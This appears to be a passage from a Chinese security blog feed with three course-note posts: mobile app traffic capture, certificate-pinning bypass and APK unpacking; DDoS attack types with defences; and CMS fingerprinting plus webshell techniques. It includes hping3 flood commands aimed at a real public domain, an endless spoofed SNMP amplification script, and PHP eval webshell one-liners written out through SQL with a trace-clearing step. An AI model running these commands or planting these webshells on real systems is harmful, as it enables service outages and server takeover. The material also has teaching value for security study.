2.用Proxifier如果设置系统代理：APP检测到设置了代理，GG相当于在模拟器或手机设置代理app–&gt;代理服务器–&gt;burp–&gt;服务端
如果用了proxifier，借助网络接口出口数据，不需要设置代理相当于在网络出口设置代理app–&gt;（已经逃离了模拟器或者手机）proxifier–&gt;本地burp–&gt;服务器app模拟器 模拟器的网络出口数据是通过本机进行的那么应该怎么操作呢？在proxifier中，找到配置文件中的代理服务器，添加一个127.0.0.1:8888的https协议的代理
proxifier+charles可以绕过简单的反代理机制
1、启动proxifier配置代理服务器和代理规则






配置代理规则：配置文件–&gt;代理规则–&gt;添加规则找到夜神模拟器的对应进程：C:\Program Files (x86)\Bignox\BigNoxVM\RT\NoxVMHandle.exeG:\tools\nox_setup_v7.0.2.7_full\Nox\bin\Nox.exe
2、启动charles
3、点击想要抓包的应用



frida+r0capture可以绕过反代理和所有证书问题
使用frida+r0capture
frida：frida&#x2F;frida: Clone this repo to build Frida
Fr0ysue：https://links.jianshu.com/go?to=https\%3A\%2F\%2Fgithub.com\%2Fr0ysue\%2Fr0capture
frida版本和python版本以及Android要对应，python版本过高会导致frida不可用，以下是不严谨的版本对应关系    frida12.3.6 –&gt; python3.7 –&gt; Android5-6    frida12.8.0 –&gt;Python3.8–&gt;Android7-8    frida14–&gt;Python3.8–&gt;Android9
1、下载相关依赖
确保自己电脑安装python环境
pip install fridapip install frida-tools##注意下载版本

安装与frida版本一致的frida工具
pip list	frida-16.7.13-cp37-abi3-win_amd64.whl	#安装包frida-server-16.7.13-android-x86.xz



解压frida-server-16.7.13-android-x86.xz
2、将frida移动到模拟器
#进入夜神模拟器文件夹进入夜神模拟器文件夹&gt;adb.exe push E:\hackerTools\tools\APK小程序\frida-server-16.7.13-android-x86 /data/local/frida#打开虚拟机终端adb shell #切换到这个目录cd /data/localchmod 777 frida #执行本文件(但是执行了还不能用需要映射一下)./frida (这个终端不可以关闭，关闭了就相当于给关闭frida了)（下次用就直接启动执行就行了，但是每次都要绑定端口）

新开一个终端
adb forward tcp:27042 tcp:27042 (绑定虚拟机的端口到主机)检测是否可以执行frida-ps -Ufrida-ps -R（不用进模拟器终端，在外面执行）



3、选择要抓取的软件包
使用APK资源提取

4、进行抓包
#抓包这个软件，并且结束的时候生成一个pcap文件（可以直接用wireshark打开）r0capture.py -U -f [目标包名或者进程号] -v -p 名字.pcap



5、使用wireshark分析流量
Xposed&amp;JustTrust&amp;HOOK可以绕过反代理、单向证书检测
1、在夜神模拟器中安装Xposed，打开后点一下version进行安装，需要root权限才能安装完成。

2、重启后，安装两个apk：JustTrustMe.apk和JustMePlush.apk，然后再次重启。然后再次开启代理

在Xposed上，点击三符号，然后选择模块
3、然后重启，其实就是利用这两个模块，把app里面的检测功能屏蔽掉。
然后在打开JustMePlush，选择牛牛棋牌，然后点一下说保存成功。

4、抓取数据包

——–APK———–基础知识1、反编译
​	将APK文件反编译成静态资源以及源码
2、反编译静态资源
​	APK实际上就是一个压缩包，可以通过直接修改后缀为zip的方式解压得到静态资源
3、反编译后的文件结构
assets文件夹
​	assets 这里存放的是静态资源文件(图片，视频等)，这个文件夹下的资源文件不会被编译。不被编译的资源文件是指在编译过程中不会被转换成二进制代码的文件，而是直接被打包到最终的程序中。这些文件通常是一些静态资源，如图片、音频、文本文件等。
lib文件夹
​	lib：.so库(c或c++编译的动态链接库)。APK文件中的动态链接库（Dynamic Link Library，简称DLL）是一种可重用的代码库，它包含在应用程序中，以便在运行时被调用。这些库通常包含许多常见的函数和程序，可以在多个应用程序中共享，从而提高了代码的复用性和效率。
lib文件夹下的每个目录都适用于不同的环境下，armeabi-v7a目录基本通用所有android设备，arm64-v8a目录只适用于64位的android设备，x86目录常见用于android模拟器，x86-64目录适用于支持x86_64架构的Android设备(适用于支持通常称为“x86-64”的指令集的 CPU)
META-INF文件夹
​	META-INF：在Android应用的APK文件中，META-INF文件夹是存放数字签名相关文件的文件夹（通过对比实现校验apk文件是否被篡改）
4、加壳
​	为了加强Android保护强度，防止被静态反编译工具破解而泄露源码。
加壳分析1、在线网站检测加壳

南明离火-移动安全分析平台
摸瓜-查诈骗APP_查病毒APP_免费APK反编译分析工具

2、工具检测
apk查壳神器

ApkCheckPack
使用很简单，直接在命令行中通过指定目标apk即可使用

脱壳工具未加壳未加壳得源码：在得到apk的静态资源时，文件夹里存在一个classes.dex文件，需要使用dex2jar工具对其进行反编译
1、反编译得到jar包
使用命令：
​	d2j-dex2jar.bat [classes.dex所在路径]
直接将classes.dex文件复制到dex2jar文件夹中，cmd打开命令行直接执行命令
会在同级目录下生成一个classes-dex2jar.jar文件
2、分析jar包
打开jd-gui程序，将生成的jar文件导入即可
静态脱壳需要搭配BlackDex64.apk使用
通过夜神模拟器将BlackDex64.apk安装
打开BlackDex64，选择脱壳的文件

查看DEX文件存储的文件

获得dex文件源码
​	通过未加壳的方式，对dex进行反编译，实现源码文件资源
动态脱壳1、首先模拟器安装要测试的apk
2、物理机安装frida-dexdump
 
3、将 frida-server-16.6.6-android-x86.xz 复制到夜神模拟器bin目录下
手机模拟器实际上就是基于Linux为底层的操作系统
D:\杂项\Nox\bin\adb.exe 提供了接口可以实现连接到Linux底层
adb connect 127.0.0.1:62001
(每种模拟器的默认端口都不同)，使用adb shell命令进行测试
4、将frida-serverx86上传的模拟器
app push [frida名称] &#x2F;data&#x2F;local&#x2F;tmp
5、使用adb shell，给frida文件赋予执行权限
adb shell
chmod 777  &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server-16.6.6-android-x86
.&#x2F;frida-server-16.6.6-android-x86
6、获得包名
​	通过BlackDex64软件查看安装文件的包名
​	
​	
7、查看当前包名的pid
 
8、在主机上安装frida(在python中script可以看到frida工具已经安装)
pip3 install frida
pip3 install frida-tools
9、进入frida-dexdump文件夹
 
打开cmd执行
.\frida-dexdump.exe -U -p pid
 
成功脱壳
 
使用dex2jar获取jar包
 
使用jd-jui打开
  
小程序逆向反编译首先要找到小程序的存放位置D:\Tencent\WeGame\WeChat Files\Applet
如果PC微信小程序软件包加密，文件以V1MMWXQ开头，需要先进行解密才可以反编译
使用工具UnpackMiniApp.exe,将文件目录的_APP_wxapkg拖动

会在wxpack文件夹下生成解密后的软件包
使用CrackMinApp进行反编译

如果工具不能使用，需要手动去反编译
首先打开工具箱里的nodejs文件夹，将解密后的小程序复制到此文件夹内，打开cmd命令，执行node.exe wuWxapkg.js [xxx.wxapkg]
会在改文件夹下生成[xxx]的文件夹
使用微信小程序开发者工具进行打开


获得到源码资源


]]></content>
      <categories>
        <category>网络安全</category>
        <category>老男孩安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>老男孩安全</tag>
      </tags>
  </entry>
  <entry>
    <title>老男孩--DDOS攻击与防御(4)</title>
    <url>/posts/f7a7b84b.html</url>
    <content><![CDATA[基础知识本教程仅在合法授权的情况下进行测试和研究，请勿用于其他用途。未经授权使用此类工具可能会侵犯他人隐私，触犯相关法律，任何因此引发的法律或利益纠纷与本人无关。
DDOS介绍DOS攻击：指的是采取一对一的方式，攻击目标服务器，使攻击目标CPU使用率提高，网络可以带宽减少等方式耗尽服务器的资源
DDOS攻击：攻击指借助于客户&#x2F;服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DoS攻击，从而成倍地提高拒绝服务攻击的威力。
被攻击时的现象：

被攻击的主机上有大量等待的TCP连接。
网络中充斥着大量的无用的数据包，源地址为假。
制造高流量无用数据，造成网络拥塞，使被攻击的主机无法正常通信。
利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求。
严重时会造成系统死机。

DDOS类型流量型攻击ICMP Flood攻击攻击介绍攻击原理：就是向目标发送大量的 ICMP Echo-Reply（type 0，code 0）或 Echo-Request（type 8，code0）报文。目的一般为耗尽目标服务器的带宽，并且机器去处理这些请求也会占用一点IO\CPU资源，但资源消耗过大就会导致DoS。
测试工具hping3
hping3 使用详解 - liuxinyu123 - 博客园
1、UDP ddos攻击：
hping3 -c 10000 -d 120 --udp -w 64 -p 80 --flood --rand-source www.baidu.com

2、ICMP ddos攻击：
hping3 -c 10000 -d 120 --icmp -w 64 -p 80 --flood --rand-source www.baidu.com



Smurf攻击攻击介绍1、介绍
​	Smurf攻击是一种分布式拒绝服务攻击（DDOS）攻击，利用IP协议中的ICMP请求和网络广播的特性，发送大量的ICMP Echo请求包，使目标主机造成网络带宽堵塞、资源消耗、拒绝服务等。
2、攻击原理

攻击者伪造受害者的IP地址向本网络广播地址发送ICMP Echo请求包
网络广播地址代表本网段的所有设备（实际上相当于发送给了所有主机ICMP Echo请求包）
本网段内的主机进行ICMP Echo回应包发送给请求的主机
受害者接收到海量回应包

3、应对方法

过滤广播地址：在网络的出口路由器上配置过滤规则，禁止广播地址的流量通过，阻止攻击者的Echo Request报文进入目标网络。
启用反向路径过滤（Reverse Path Filtering）：通过验证数据包的源IP地址是否为网络出口合法的路径返回地址，来过滤掉源IP地址伪造的报文。
使用流量限制措施：通过使用防火墙和入侵检测系统（IDS）等技术，对网络流量进行监控和管理，及时发现并限制异常流量。
升级网络设备：确保网络设备的固件和软件及时更新至最新版本，以修复已知漏洞，提升网络安全性。

测试工具使用Kali hping3进行
sudo hping3 -1 -a 192.168.1.100 -c 10000 192.168.1.255-l：使用ICMP协议-a：伪造的受害者IP地址-c：发送的请求次数192.168.1.255：本网段的广播地址



Ping of Death攻击介绍1、介绍
​	Ping of Death：又称为死亡之ping，通过大量的畸形ICMP请求包
2、攻击原理
​	这种攻击通过发送大于65536字节的ICMP包使操作系统崩溃；通常不可能发送大于65536个字节的ICMP包，但可以把报文分割成片段，然后在目标主机上重组；最终会导致被攻击目标缓冲区溢出，引起拒绝服务攻击。有些时候导致telnet和http服务停止，有些时候路由器重启。
3、适用版本

Windows 系统：
Windows 95
Windows 98
Windows ME
Windows NT 4.0（未打补丁的版本）


Linux 系统：
早期的 Linux 内核版本（2.0及更早版本）
某些未修补的嵌入式 Linux 系统


Unix 系统：
BSD&#x2F;OS（某些版本）
早期的 Solaris 和 HP-UX 版本



测试方法ping -l 65500 192.168.2.1 -t

UDP Flood攻击攻击介绍1、介绍
​	向攻击者向受害者发送大量的UDP数据包，造成受害者服务器卡顿、负载提示、网络卡顿等问题
2、攻击原理
​	在短时间内 模拟随机的源端口地址向随机的目的端口发送大量的udp包，造成目标主机不能处理其他udp的请求
3、防御方法
​	UDP是无状态连接协议，常用于僵尸网络的DDOS攻击，比起TCP来说更难防御。通过设置防火墙，对UDP包的IP，端口，速率可针对性防御。另外，UDP Flood除了消耗受害者资源，也会消耗大量攻击者资源。
测试方法1、使用hping3 进行测试
hping3 -c 10000 -d 120 --udp -w 64 -p 80 --flood --rand-source www.baidu.com--udp：使用udp进行攻击-p：指定攻击的端口-c：请求次数-d：发送的数据包大小-w：窗口大小--flood：尽最快发送数据包，不显示回复--rand-source：产生随机源端口



连接型攻击TCP Flood攻击攻击介绍1、介绍：
了解TCP Flood攻击需要先了解TCP的三次握手机制：


客户端向服务都发送一个SYN包，用来请求与服务器建立连接
服务器收到SYN包，回复一个SYN+ACK包，用于表示可以与客户端建立连接
客户端收到服务器发送的SYN+ACK包，向服务器发送ACK，表示连接状态建立

TCP Flood攻击：利用了这种会话建立机制，大量向服务端发送SYN请求包请求建立连接，收到SYN+ACK包后，不会发送ACK包，导致服务器一直占用会话耗尽服务器资源。
渗透方法SYN ddos攻击：
hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source www.baidu.com-c：发送的请求数量-d：发送到攻击方的数据包大小-S：只发送SYN包-w：指定窗口大小-p：指定攻击的窗口，可以使用任意端口--flood：尽量快速的发送--rand-source：源ip随机产生









ACK洪水攻击攻击介绍1、介绍
​	ACK洪水攻击：实在TCP建立完连接之后，攻击者将所有传输的TCP数据包都带有ACK标志位的数据包。
2、原理
​	接收端在收到一个带有ACK标志位的数据包的时候，需要检查该数据包所表示的连接四元组是否存在，如果存在则检查该数据包所表示的状态是否合法，然后再向应用层传递该数据包。
​	如在检查中发现数据包不合法，如所指向的目的端口未开放，则操作系统协议栈会回应RST包告诉对方此端口不存在。
此时服务器要做两个动作，查表和回应ack&#x2F;rst。
​	对攻击者来说发送带有ACK标志位的TCP数据包消耗小；
​	但对于服务器进行查表动作时，所消耗的资源大于攻击者发送数据包的消耗

3、防御方法
抗D设备基于目的地址对ack报文速率进行统计，当ack报文速率超过阈值启动源认证防御。
测试方法ACK ddos攻击：
hping3 -c 10000 -d 120 -A -w 64 -p 80 --flood --rand-source www.baidu.com-c：发送的请求数量-d：发送到攻击方的数据包大小-A：参数用于设置 TCP 包头中的 ACK（确认，Acknowledgment）标志。ACK 标志用于表示该包是一个确认包，通常用于 TCP 协议中确认接收到数据。-w：指定窗口大小-p：指定攻击的窗口，可以使用任意端口--flood：尽量快速的发送--rand-source：源ip随机产生



WebSocket攻击攻击介绍1、websocket介绍
​	WebSocket是通过HTTP协议发起的一个双向全双工的通信协议。WebSocket协议被广泛用在现代WEB程序中用于数据流的传输和异步通信。
2、websocket和http区别
大多数的Web浏览器和Web网站都是使用HTTP协议进行通信的。通过HTTP协议，客户端发送一个HTTP请求，然后服务器返回一个响应。通常来说，服务端返回一个响应后，这个HTTP请求事务就已经完成了。即使这个HTTP连接处于keep-alive的状态，它们之间的每一个工作(事务)依然是请求与响应，请求来了，响应回去了。这个事务就结束了。所以通常来说，HTTP协议是一个基于事务性的通信协议。
而WebSocket呢，它通常是由HTTP请求发起建立的，建立连接后，会始终保持连接状态。客户端和服务端可以随时随地的通过一个WebSocket互发消息，没有所谓事务性的特点。这里要注意了，源于其双向全双工的通信特点，在一个WebSocket连接中，服务端是可以主动发送消息的哦，这一点已经完全区别于HTTP协议了。
因此，基于以上特点，WebSocket通常用于低延迟和允许服务器发送消息的场景。例如，金融行业常用WebSocket来传输实时更新的数据。
3、攻击原理

使用WebSocket协议的持久连接，攻击者发送大量数据或保持长连接。
消耗服务器资源，导致正常用户无法访问。

特殊协议缺陷型攻击Slowloris慢性攻击攻击介绍1、介绍
Slowloris 的核心原理是通过建立大量半开的 HTTP 连接，耗尽目标服务器的资源，导致它无法处理合法的请求。它发送部分 [HTTP 请求头](https://so.csdn.net/so/search?q=HTTP 请求头&amp;spm&#x3D;1001.2101.3001.7020)，但从不完成请求，并定期发送数据保持连接处于活跃状态。这样，目标服务器会持续消耗资源等待完成的请求。2、攻击原理
1.发出大量 HTTP 请求。2.定期（每约 15 秒）发送标头以保持连接打开。3.除非服务器这样做，否则我们永远不会关闭连接。如果服务器关闭一个连接，我们会创建一个新连接，继续做同样的事情。
这会耗尽服务器线程池，并且服务器无法回复其他人。 
3、防范措施
如何防护Slowloris攻击1、提高服务器的客户端连接数量
2、限制传入请求个数：限制单个IP 地址允许建立的最大连接数
3、使用一些DDOS方法安全工具
4、限制HTTP头部传输的最大许可时间：超过指定时间HTTP Header还没有传输完成，直接判定源IP地址为慢速连接攻击，中断连接并加入黑名单。
测试方法gkbrk&#x2F;slowloris: Low bandwidth DoS tool. Slowloris rewrite in Python.
python slowloris.py 192.168.30.158positional arguments:  host                  Host to perform stress test onoptions:  -h, --help            show this help message and exit  -p PORT, --port PORT  Port of webserver, usually 80  -s SOCKETS, --sockets SOCKETS                        Number of sockets to use in the test  -v, --verbose         Increases logging  -ua, --randuseragents                        Randomizes user-agents with each request  -x, --useproxy        Use a SOCKS5 proxy for connecting  --proxy-host PROXY_HOST                        SOCKS5 proxy host  --proxy-port PROXY_PORT                        SOCKS5 proxy port  --https               Use HTTPS for the requests  --sleeptime SLEEPTIME                        Time to sleep between each header sent.





DNS放大攻击攻击介绍1、介绍
​	DNS放大攻击：攻击者通过恶意构造udp数据包报头，伪造受害者的IP信息，向DNS服务器发送解析请求，将DNS服务器的响应包引入给受害者服务器。
​	DNS查询通常通过UDP协议发送。UDP是一种“发即忘”协议，这意味着不需要通过握手来验证数据包IP地址的真实性。
2、攻击原理
​	攻击者的dns查询包消耗很小，但返回的响应包数据量很大，所以攻击者伪造受害者IP大量请求DNS解析请求，将查询的大量记录返回给受害者IP造成受害者服务器资源耗尽，服务器宕机。
3、防御措施
限制DNS服务器的递归查询、部署流量清洗设备以及使用DNSSEC协议
SNMP放大攻击攻击介绍1、介绍
​	snmp：通过一台客户端机器向一个被管理的设备发出查询请求获取这台设备当前运行状态的检测等情况，网络监控一般是基于SNMP与Agent。
​	在SNMP的服务中，被监控设备端口UDP 161为主动查询请求；162端口为监控方在固定时间内受监控端向监控端自动发送查询请求。同时管理信息数据库MIB是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类（类似树形图），包含分属不同组的多个数据对象
2、攻击原理
​	利用SNMP协议的请求-响应机制，发送大量SNMP Get请求，伪造源IP。
3、影响危害
​	目标网络因响应数据过多而拥塞。
4、防御方法
​	禁用SNMP或限制其访问，定期更新固件防止漏洞利用。
测试方法1、使用nmap扫描指定的地址端
nmap -sU 192.168.10.1snmp------&gt;192.168.10.24



2、构建python脚本
#!/usr/bin/env pythonfrom scapy.all import *i = IP(dst=&quot;192.168.10.24&quot;,src=&quot;192.168.10.234&quot;)u = UDP(sport=161,dport=161)s = SNMP(community=&#x27;public&#x27;)b = SNMPbulk(max_repetitions=200,varbindlist=[SNMPvarbind(oid=ASN1_OID(&#x27;1.3.6.1.2.1.1&#x27;)),SNMPvarbind(oid=ASN1_OID(&#x27;1.3.6.1.2.1.19.1.3&#x27;))])s.PDU=br = i/u/swhile 1:	send(r)





HTTP洪水攻击攻击介绍1、介绍
​	HTTP洪水攻击： HTTPFlood是一种针对Web服务的第七层攻击，通过模拟正常用户请求消耗服务器资源。
2、攻击原理
​	攻击者通过代理或僵尸主机向目标服务器发起大量的HTTP报文，请求涉及数据库操作的URI（Universal Resource Identifier）或其它消耗系统资源的URI，造成服务器资源耗尽，无法响应正常请求。
3、防御方法
HTTP Flood源认证：

META刷新：阻止非浏览器客户端的访问，僵尸工具无法通过认证。
验证码认证：通过推送验证码判断HTTP访问是否由真实用户发起，防御效果较好。
302重定向模式：对嵌套资源服务器启动302重定向防御，探测访问源是否为真实浏览器。

HTTP源统计：
​	HTTP源统计是在基于目的IP流量异常的基础上，对源IP流量进行统计，判定具体某个源流量异常，并对其进行限速。
动态指纹学习
​	动态指纹学习适用于攻击源访问的URI比较固定的情况。Anti-DDoS设备对源访问的URI进行指纹学习，找到攻击目标URI指纹，如果对该URI指纹的命中次数高于设置的阈值就将该源加入黑名单。
测试方法​	工具：

注意 填写的url要与数据库进行交互
CC攻击攻击介绍1、介绍
​	CC攻击是一种试图通过使目标系统的资源耗尽来提供拒绝服务的攻击方式。它通常基于建立大量无效的连接或发送大量恶意请求，超过目标系统的处理能力，从而导致系统崩溃或无法正常工作。CC攻击通常由单台计算机或少量机器发起。
2、原理
​	CC攻击通常运用于通过攻击种子服务器（Seed Server）发出大量伪造的请求或连接来骚扰目标系统。这种攻击通常通过模拟大量用户访问（如使用恶意脚本或利用漏洞）来获取目标系统的资源。攻击者还可以使用代理服务器、TOR网络等技术来隐藏自己的身份和位置。
3、与DDOS的区别
​	规模和资源使用：CC攻击通常是相对较小规模的攻击，通常仅由一台计算机或几台计算机发起，资源使用相对较少。DDoS攻击则是通过使用分布在全球范围内的多台计算机，协同合作发起大规模攻击，消耗更多的网络资源和带宽。
​	攻击方式：CC攻击的目标是耗尽目标系统的资源，通过建立大量的无效连接或发送恶意请求来实现。DDoS攻击则在通过大量流量发送来超出目标系统的处理能力，让系统无法正常运行。
​	攻击协同性：CC攻击通常由单台计算机或少量机器发起，攻击者的目标是通过耗尽目标资源来实现拒绝服务。DDoS攻击则涉及到多个攻击端（发起者），它们可以同时从多个方面攻击目标系统，通过协调行动提高攻击效果。
4、CC攻击防御：

限制连接请求的速率
使用验证码
检测和封锁代理服务器
监测网络流量，识别异常行为，使用入侵检测系统和防火墙

测试方法使用安防cc进行测试

总结​	以上就是相关DDOS的知识总结，欢迎和博主进行技术交流VX：GoldY_66
]]></content>
      <categories>
        <category>网络安全</category>
        <category>老男孩安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>老男孩安全</tag>
      </tags>
  </entry>
  <entry>
    <title>老男孩--内网渗透(5)</title>
    <url>/posts/f254f946.html</url>
    <content><![CDATA[获取webshell方法总结CMS获取webshell什么是CMS
​	CMS系统指的是内容管理系统。已经有别人开发好了整个网站的前后端，使用者只需要部署cms，然后通过后台添加数据，修改图片等工作，就能搭建好一个的WEB系统。
如何搜寻CMS信息
​	常见方法：[信息收集-CMS识别-CSDN博客](https://blog.csdn.net/m0_37856131/article/details/122924979#:~:text=到您要检查的网站--&gt;按 Ctrl %2B U 显示页面代码—&gt;在 html 页面上找到前缀为meta name%3D”generator”content%3D的标签—&gt;引擎名称将在“内容”一词后用引号表示,js 文件路径的行中。 例如，wp-includes 和 wp-content 表明该网站由 Wordpress 提供支持)
在线信息收集网站国内http://whatweb.bugscaner.com        #识别CMS插件
https://www.yunsee.cn                    #云悉CMS识别
http://finger.tidesec.net                   #潮汐指纹识别
https://www.godeye.vip                  #WEB指纹识别
1.2：国外http://itrack.ru/whatcms                 #CMS识别国外 （俄罗斯）
https://builtwith.com                      #全面的 CMS 检测
https://sitereport.netcraft.com      #网站CMS识别
https://cmsdetect.com                  #CMS识别
https://rescan.io                            #CMS列表识别
https://scanwp.net                        #包括插件也监测
https://www.isitwp.com                #专注WordPress识别
https://www.codeinwp.com/find-out-what-wordpress-theme-is-that
CMS识别工具御剑WEB指纹识别
相关链接：http://www.xitongzhijia.net/soft/171203.html  （文件自测）
TideFinger（潮汐）
项目地址：https://github.com/TideSec/TideFinger
安装教程：git clone https://github.com/TideSec/TideFinger.gitcd TideFinger&#x2F;cd python3&#x2F; &amp;&amp; pip3 install -r requirements.txt  -i https://mirrors.aliyun.com/pypi/simple/
使用说明：python3 TideFinger.py -u http://www.123.com [-p 1] [-m 50] [-t 5] [-d 0]   -u: 待检测目标URL地址   -p:指定该选项为1后，说明启用代理检测，请确保代理文件名为proxys_ips.txt,每行一条代理，格式如: 124.225.223.101:80   -m: 指纹匹配的线程数，不指定时默认为50   -t: 网站响应超时时间，默认为5秒   -d: 是否启用目录匹配式指纹探测（会对目标站点发起大量请求），0为不启用，1为启用，默认为不启用
WhatWeb（kali自带）
项目地址：https://github.com/urbanadventurer/WhatWeb.git
安装教程：cd WhatWeb &amp;&amp; apt install ruby-bundler &amp;&amp;  bundle install &amp;&amp;
使用说明：whatweb www.baidu.com
大宝剑
项目地址：https://github.com/wgpsec/DBJ
多CMS识别工具项目地址：https://github.com/Tuhinshubhra/CMSeek
其他识别CMS方法CMS识别指纹(浏览器插件)WhatRuns
Wappalyzer
F12代码JS文件    如果有不知道CMS的网站，可以F12查看网站源代码的JS、CSS等文件，找特殊字符，然后去Github或者红迪（Reddit）网去搜索找到的字符。
CMS的名称在页面的源代码中指定    到您要检查的网站–&gt;按 Ctrl + U 显示页面代码—&gt;在 html 页面上找到前缀为meta name&#x3D;”generator”content&#x3D;的标签—&gt;引擎名称将在“内容”一词后用引号表示
文件路径    CMS 可以通过代码的典型文件夹及其结构来识别。特别是在指示 js 文件路径的行中。例如，wp-includes 和 wp-content 表明该网站由 Wordpress 提供支持
网站页脚中的指示    CMS 名称有时可以在页脚、底部的小字体、联系信息或额外的公司信息下找到
链接结构分析    如果网站页面的 URL 是在没有使用 CNC 生成器的情况下形成的，您会注意到页面文本中特定于特定 CMS 的部分。
WordPress 和 Joomla 的特定信息的链接可以在下面的示例中看到
WordPress：website_name&#x2F;р&#x3D;123
Joomla：website_name&#x2F;index.php?option&#x3D;com_content&amp;
task&#x3D;view&amp;id&#x3D;12&amp;Itemid&#x3D;345website_name&#x2F;content&#x2F;view&#x2F;12&#x2F;345&#x2F;
管理员登录网址    上使用的 CMS 可以通过查看指向网站管理面板的 URL 来确定。这是 WordPress，例如，如果将 &#x2F;wp-admin&#x2F; 添加到 URL 栏中的域名，则会将您带到带有登录名和密码输入窗口的页面。
site_name&#x2F;wp-admin&#x2F; - WordPress
site_name&#x2F;administrator&#x2F; - Joomla
site_name&#x2F;admin&#x2F; - OpenCart
SiteName&#x2F;user&#x2F; - Drupal
网站特有文件    如&#x2F;templets&#x2F;default&#x2F;style&#x2F;dedecms.css—dedecms
网站MD5指纹    一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。
一些汇总    网站文件命名规则
​	返回头的关键字
​	网页关键字
​	Url特征
​	Meta特征
​	Script特征
​	robots.txt
​	网站路径特征
CMS漏洞检测工具wordpress项目地址：https://github.com/rastating/wordpress-exploit-framework
项目地址：https://github.com/n00py/WPForce
项目地址：https://github.com/wpscanteam/wpscan
描述 ：WPScan WordPress 安全扫描器
使用：kali–&gt;wpscan –url “目标网站”
Drupal项目地址：https://github.com/SamJoan/droopescan项目地址：https://github.com/immunIT/drupwn
安装教程：git clone https://github.com/immunIT/drupwn.git &amp;&amp; cd drupwnpip3 install -r requirements.txt 
使用说明：.&#x2F;drupwn –mode enum –target “目标地址”  –mode MODE     模式枚举|利用  –target TARGET   要扫描的目标主机名
Joomla项目地址：https://github.com/OWASP/joomscan
描述：OWASP Joomla 漏洞扫描程序项目
安装教程：kali–&gt;apt install joomscan
使用：joomscan -u “目标”
cmseek项目地址：https://github.com/Tuhinshubhra/CMSeeK
安装教程：
git clone https://github.com/Tuhinshubhra/CMSeeK &amp;&amp; cd CMSeeK
pip3 install -r requirements.txt
使用说明：python3 cmseek.py -u “目标地址”  
#######以上三款工具都可kali安装#########
几个在线CMS漏洞扫描网站https://wpsec.com/                                                          #wordpress专业扫描
https://wpscan.com/                                                        #wordpress专业扫描
https://www.malcare.com/wordpress-malware-scan/     #wordpress专业扫描
https://hackertarget.com/scan-membership/                 #通用-收费
https://gf.dev/                                                                  #综合测试
https://pentest-tools.com/                                              #2次免费扫描
https://www.automox.com/        
相关参考链接：
https://zhuanlan.zhihu.com/p/355150689
https://zhuanlan.zhihu.com/p/402320861
https://www.cnblogs.com/qingchengzi/articles/13533704.html
非CMS获取webshell更多的时候企业并不使用开源的CMS，而是选择自己开发源代码，这里的思路分为有权限和无权限两方面来分析
有管理权限的情况：是指前期通过其他方法，已经破解了管理后台功能，可以使用管理后台的情况
通过正常上传一句话小马获取webshell
检查网站是否过滤上传文件后缀格式，如果未过滤直接上传一句话小马即可。
找到网站默认配置，将一句话小马插入配置中因为有些网站没有对配置参数进行过滤，所以配置中的小马被读取后，就可能被连接

建议先下载该站源码，进行查看源码过滤规则，以防插马失败。插马失败很有可能会导致网站被你的小马中没有闭合标签导致网站出错。注意要闭合原有的代码，保证语法正确，以免程序运行出错。
利用后台数据库备份获取webshell一般网站都不允许上传脚本类型文件，如 asp、php、jsp、aspx等文件。但一般后台都会有数据库备份功能。步骤如下

上传允许格式的小马(如图片马)
找到文件上传后的文件路径
通过数据库备份，指定备份源文件与与备份后格式。

如果后台限制了备份路径，可以尝试F12修改文本框元素
通过花样上传一句话小马获取Webshell使用BurpSuite 工具，%00截断、特殊名文件名绕过、文件名大小写绕过、黑白名单绕过等等，想尽一切办法就是要上传一句话木马，通过各种变形，万变不离其宗，换汤不换药。
通过编辑模块、标签等拿WebShell①通过对网站的模块进行编辑写入一句话，然后生成脚本文件拿WebShell
②通过将木马添加到压缩文件，把名字改为网站模板类型，上传到网站服务器，拿WebShell
SQL命令获取有一定的数据库权限的情况下，通过向数据库表写入马，然后备份该表为脚本文件的方式进行大致步骤：

创建表
将一句话写入刚创建的表中
查询一句话所在表到文件，成功将一句话写入文件

第一种方法：
CREATE TABLE `mysql`.`best` (`best1` TEXT NOT NULL );  #将一句话木马插入到mysql库best表best1字段INSERT INTO `mysql`.`best` (`best1` ) VALUES (&#x27;&lt;?php @eval($_POST[password]);?&gt;&#x27;);#查询这个字段导出到网站的文件中SELECT `best1` FROM `best` INTO OUTFILE &#x27;d:/wamp/www/best.php&#x27;;#把痕迹清除DROP TABLE IF EXISTS `best`;

第二种方法：优先推荐，简单明了，且避免了误删别人的数据！
#直接将查询出来的语句写入文件select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;INTO OUTFILE &#x27;d:/wamp/www/best3.php&#x27;

利用解析漏洞拿WebShell1）IIS5.x / 6.0 解析漏洞2）IIS 7.0 / IIS 7.5 / Nginx &lt;8.03 畸形解析漏洞3）Nginx &lt; 8.03 空字节代码执行漏洞4）Apache 解析漏洞

其他的还有命令执行漏洞，反序列化漏洞等
利用编辑器漏洞拿WebShell利用网站的编辑器上传木马，搜索已知的编辑器漏洞，常见的编辑器有 fckeditor、ewebeditor、cheditor等，有时候没有管理员权限也可以拿下webshell。
文件包含拿WebShell
首先需要存在文件包含漏洞
先将WebShell 改为txt格式文件上传
然后上传一个脚本文件包含该txt格式文件
通过这种方式，可绕过WAF拿WebShell

上传其它脚本类型拿WebShell
此类型用于一台服务器具有多个网站a网站是asp的站，b可能是php的站，分别限制了asp和php文件的上传，可以尝试向A上传php的脚本，来拿Shell
也可以尝试将脚本文件后缀名改为asa 或者在后面直接加个点（.）如”xx.asp.”， 来突破文件类型限制进行上传拿WebShell

修改网站上传类型配置来拿WebShell某些网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp | php | jsp | aspx | asa 后缀名来拿WebShell
非管理权限
SQL注入漏洞前提条件，具有足够权限，对写入木马的文件夹有写入权限，知道网站绝对路径
